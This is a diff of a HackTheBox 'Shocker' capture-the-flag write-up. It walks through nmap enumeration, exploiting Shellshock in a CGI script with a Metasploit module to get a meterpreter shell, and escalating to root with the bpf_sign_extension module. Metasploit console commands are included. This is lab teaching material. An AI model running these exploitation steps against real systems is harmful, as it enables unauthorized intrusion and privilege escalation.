@@ -1,8 +1,8 @@
 # HackTheBox Shocker
 
-### Enumeration 
-
 [Sources](https://github.com/BurntxNoodle/RedTeam/tree/master/HackTheBox%20Writeups/HTB%20-%20Shocker#Sources)
+
+### Enumeration 
 
 Starting of with a standard enumeration scan: ```nmap -sC -sV -oA shocker 10.10.10.56```. Bellow is the output:
 
@@ -45,9 +45,83 @@ Here are the results of the scan:
 
 ![image](https://user-images.githubusercontent.com/41026969/72948083-1f4d6580-3d52-11ea-920b-3a6c7dff329c.png)
 
-This time, we see there's a ```user.sh``` inside the ```cgi-bin``` directory!
+This time, we see there's a ```user.sh``` inside the ```cgi-bin``` directory! 
+
+Doing some research I come across [this Rapid7 page](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec) with a metasploit module. 
+
+Here's setting the correct options:
+
+![image](https://user-images.githubusercontent.com/41026969/72995812-8eb16c80-3dc7-11ea-8a03-7d01ef98bd4a.png)
+
+Running the module, we get a meterpreter session! Doing ```getuid``` and ```sysinfo``` outputs the following:
+
+![image](https://user-images.githubusercontent.com/41026969/72996111-1a2afd80-3dc8-11ea-9c72-0b3b55752829.png)
+
+Doing the meterpreter command ```shell``` gives us a local shell to work with. Doing a ```whoami``` check shows we are user ```shelly```. Looking around the computer, eventually I land in ```/home/shelly``` and doing an ```ls -la``` check there reveals the ```user.txt``` flag!
+
+##### Privesc
+To get a list of potential exploits that can work against this box, I use metasploit's suggester module: 
+
+```
+msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use post/multi/recon/local_exploit_suggester
+msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+```
+
+Running the module we get a few results:
+
+![image](https://user-images.githubusercontent.com/41026969/72999796-e4891300-3dcd-11ea-9910-8f8d35893c59.png)
+
+I try the first module that the box ```appears to be vulnerable``` by: ```linux/local/bpf_sign_extension_priv_esc```.
+
+Setting the correct options:
+
+```
+msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/bpf_sign_extension_priv_esc
+msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > show options
+
+Module options (exploit/linux/local/bpf_sign_extension_priv_esc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Auto
+
+
+msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set SESSION 1
+SESSION => 1
+```
+
+At first, when I run the exploit, I get a ```[*] Exploit completed, but no session was created.```. Looking into the settings I try something different by setting the LHOST (local host) to my HackTheBox address:
+
+```
+msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set LHOST 10.10.14.48
+LHOST => 10.10.14.48
+```
+
+Then rerunning the exploit, this time we get a second meterpreter session!
+
+Doing a ```getuid``` in meterpreter or ```whoami``` in the local shell, it shows we have root access:
+
+![image](https://user-images.githubusercontent.com/41026969/73001458-801b8300-3dd0-11ea-8532-369ac5ec5dff.png)
+
+Looking around the box, I come across the root flag in ```/root/root.txt```
+
+### Flags
+- user: ```/home/shelly/user.txt```
+
+- root: ```/root/root.txt```
 
 ### Sources
 
 - [CGI wiki page](https://en.wikipedia.org/wiki/Common_Gateway_Interface#Using_CGI_scripts)
 - [Shellshock wiki page](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
+- [mod-CGI bash environment Rapid7 page](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec)
+- [Shocker video writeup by IppSec](https://www.youtube.com/watch?v=IBlTdguhgfY&)
